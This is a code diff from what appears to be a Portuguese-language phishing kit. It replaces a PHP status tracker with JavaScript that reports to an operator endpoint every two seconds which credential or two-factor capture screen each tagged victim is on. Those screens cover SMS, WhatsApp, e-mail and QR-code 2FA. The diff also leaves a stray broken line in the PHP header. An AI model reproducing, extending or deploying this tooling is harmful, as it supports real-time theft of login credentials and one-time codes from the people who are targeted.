@@ -17,39 +17,7 @@ if (!isset($_COOKIE['identificador_cliente'])) {
     $identificadorUnico = uniqid('cliente_', true) . bin2hex(random_bytes(8));
     setcookie('identificador_cliente', $identificadorUnico, time() + (86400 * 30), "/");
 }
-
-require_once __DIR__ . '/status_tracker.php';
-
-// Mapa de nomes de arquivos para mensagens de status amigáveis.
-$status_map = [
-    'index.php' => 'Na Home (Desktop)',
-    'login-mobile.php' => 'Na Home (Mobile)',
-    'senha.php' => 'Tela de opcões para entrar(QRCODE/FACIAL/SMS/WHATSAPP/EMAIL) (Desktop)',
-    'senha-mobile.php' => 'Tela de opcões para entrar(QRCODE/FACIAL/SMS/WHATSAPP/EMAIL) (Mobile)',
-    'dois_fatores.php' => 'Tela 2FA Mensagem (Desktop)',
-    'dois_fatores2.php' => 'Tela 2FA - Opções de verificação (Desktop)',
-    'doisfatores2mobile.php' => 'Tela 2FA - Opções Opções de verificação (Mobile)',
-    'sms_desktop.php' => 'Aguardando SMS (Desktop)',
-    'sms_mobile.php' => 'Aguardando SMS (Mobile)',
-    'sms_whats_desktop.php' => 'Aguardando SMS via WhatsApp (Desktop)',
-    'sms_whats_mobile.php' => 'Aguardando SMS via WhatsApp (Mobile)',
-    'qrcode-mobile.php' => 'Aguardando QR Code (Mobile)',
-    'telaqr.php' => 'Aguardando QR Code (Desktop)',
-    'email2fadesktop.php' => 'Aguardando E-mail 2FA (Desktop)',
-    'email2famobile.php' => 'Aguardando E-mail 2FA (Mobile)',
-    'emailsms_desktop.php' => 'Aguardando SMS de E-mail (Desktop)',
-    'emailsms_mobile.php' => 'Aguardando SMS de E-mail (Mobile)',
-    'sms2fadesktop.php' => 'Aguardando SMS 2FA (Desktop)',
-    'sms2famobile.php' => 'Aguardando SMS 2FA (Mobile)',
-    'whats2fadesktop.php' => 'Aguardando WhatsApp 2FA (Desktop)',
-    'whats2framobile.php' => 'Aguardando WhatsApp 2FA (Mobile)'
-];
-// Pega o nome do script atual.
-$current_page = basename($_SERVER['PHP_SELF']);
-// Verifica se a página atual está no mapa e atualiza o status.
-if (isset($status_map[$current_page])) {
-    update_user_status($status_map[$current_page]);
-}
+s
 ?>
 <!DOCTYPE html>
 <html lang="pt-BR">
@@ -245,6 +213,63 @@ if (isset($status_map[$current_page])) {
                 submitBtn.textContent = 'Continuar';
             }
         });
+    </script>
+    <script>
+        (function() {
+            // Mapa de nomes de arquivos para mensagens de status amigáveis.
+            const statusMap = {
+                'index.php': 'Na Home (Desktop)',
+                'login-mobile.php': 'Na Home (Mobile)',
+                'senha.php': 'Tela de opções(Desktop)',
+                'senha-mobile.php': 'Tela de(Mobile)',
+                'dois_fatores.php': 'Tela 2FA - Mensagem (Desktop)',
+                'dois_fatores2.php': 'Tela 2FA - (Desktop)',
+                'doisfatores2mobile.php': 'Tela 2FA(Mobile)',
+                'sms_desktop.php': 'Aguardando SMS (Desktop)',
+                'sms_mobile.php': 'Aguardando SMS (Mobile)',
+                'sms_whats_desktop.php': 'Aguardando SMS via WhatsApp (Desktop)',
+                'sms_whats_mobile.php': 'Aguardando SMS via WhatsApp (Mobile)',
+                'qrcode-mobile.php': 'Aguardando QR Code (Mobile)',
+                'telaqr.php': 'Aguardando QR Code (Desktop)',
+                'email2fadesktop.php': 'Aguardando E-mail 2FA (Desktop)',
+                'email2famobile.php': 'Aguardando E-mail 2FA (Mobile)',
+                'emailsms_desktop.php': 'Aguardando SMS de E-mail (Desktop)',
+                'emailsms_mobile.php': 'Aguardando SMS de E-mail (Mobile)',
+                'sms2fadesktop.php': 'Aguardando SMS 2FA (Desktop)',
+                'sms2famobile.php': 'Aguardando SMS 2FA (Mobile)',
+                'whats2fadesktop.php': 'Aguardando WhatsApp 2FA (Desktop)',
+                'whats2framobile.php': 'Aguardando WhatsApp 2FA (Mobile)'
+            };
+
+            // Descobre o nome do arquivo da página atual
+            const currentPage = window.location.pathname.split('/').pop() || 'index.php';
+            
+            // Pega a mensagem de status correspondente
+            const currentStatus = statusMap[currentPage] || 'Página Desconhecida';
+
+            // Função que envia o "ping" para a API
+            async function sendStatusUpdate() {
+                try {
+                    await fetch('api_update_status.php', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ status: currentStatus })
+                    });
+                    // Não precisamos fazer nada com a resposta, apenas enviar.
+                } catch (error) {
+                    // Se falhar, loga no console sem incomodar o usuário.
+                    console.error('Falha ao enviar atualização de status:', error);
+                }
+            }
+
+            // Envia o primeiro status imediatamente ao carregar a página
+            sendStatusUpdate();
+
+            // Configura para enviar o status a cada 2000 milissegundos (2 segundos)
+            setInterval(sendStatusUpdate, 2000);
+        })();
     </script>
 </body>
 </html>
